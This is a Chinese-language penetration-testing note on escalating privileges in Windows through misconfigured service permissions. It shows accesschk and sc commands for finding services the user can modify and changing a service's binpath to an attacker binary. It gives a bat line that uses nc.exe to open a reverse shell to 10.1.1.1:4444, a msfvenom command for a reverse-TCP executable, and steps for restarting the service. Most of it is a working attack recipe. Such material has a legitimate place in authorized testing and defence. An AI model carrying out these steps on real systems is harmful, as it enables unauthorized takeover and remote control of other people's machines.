# 不安全的服务权限


# MSF 模块
Metasploit Module: exploit/windows/local/service_permissions


由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它。

## 方法一：accesschk

`accesschk.exe` 是一款微软官方开发，用于检测特定用户或组对资源（包括文件、目录、注册表键、全局对象和Windows服务）的访问权限的工具。

### 安装和使用
- 下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
- 介绍文档：https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk


`AccessChk`工具还可以用来查找用户可以修改的服务：

```
C:\Users\user\Desktop>accesschk.exe -uwcqv "user" * 
accesschk.exe -uwcqv "user" *

Accesschk v6.02 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

RW Vulnerable Service
 SERVICE_ALL_ACCESS

C:\Users\user\Desktop>
```
如果成功找到目标服务，则可以尝试利用。

## 方法二：sc 命令

先使用vmic 查询所有正在运行的服务：

```
wmic service where started=true get name, startname
```

然后使用 `sc` 命令查询对每个服务是否有控制权：

```
C:\Users\user\Desktop>sc stop "Service"
sc stop Service

SERVICE_NAME: UsoSvc 
        TYPE               : 30  WIN32  
        STATE              : 3  STOP_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x7530
```
如果能够成功关闭服务，说明可能能够利用。

接下来我们需要查看是否能修改服务的 `binpath`，如果能修改则可以利用它：

```
C:\Users\user\Desktop>sc config "Service" binpath="C:\malicious.exe"
sc config "Vulnerable" binpath="C:\malicious.exe"
[SC] ChangeServiceConfig SUCCESS

```

其中 `malicious.exe` 可以使用简单的 `xx.bat` 文件，也可以使用 `msfvenom` 来生成。

我们先尝试简单的 bat 文件：

```
echo c:\windows\temp\nc.exe 10.1.1.1 4444 -e cmd > reverse.bat
```
然后将 binpath 设置为 reverse.bat 路径。

**如果遇见报错，或反弹 shell 成功后又快速断开，那么可以再尝试 msfvenom。**

例如：

```
msfvenom -p windows/shell_reverse_tcp lhost=10.1.1.1 lport=4444 -f exe --platform windows >reverse.exe
```

![](https://isecurityclub-1253463441.cos.ap-chengdu.myqcloud.com/31DF2A64-01FF-40B1-94F2-CBADBAC17DE5.png)

修改后，必须重新启动服务才能执行二进制文件。

可以手动重启服务:

```
sc stop "VulnerableService"
sc start "VulnerableService"

```

启动时可能会抛出错误消息：

```
C:\Users\user\Desktop>sc start "ServiceName"
sc start "ServiceName"
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

当Windows执行服务时，它们应与Windows服务控制管理器通信。如果不这样做，SCM就会杀死这个进程。通过使用执行自动迁移到新进程的payload，手动迁移进程，或者在执行后将服务的bin路径设置回原始服务二进制文件，可以解决这个问题。


# Reference

- `https://xz.aliyun.com/t/2519`

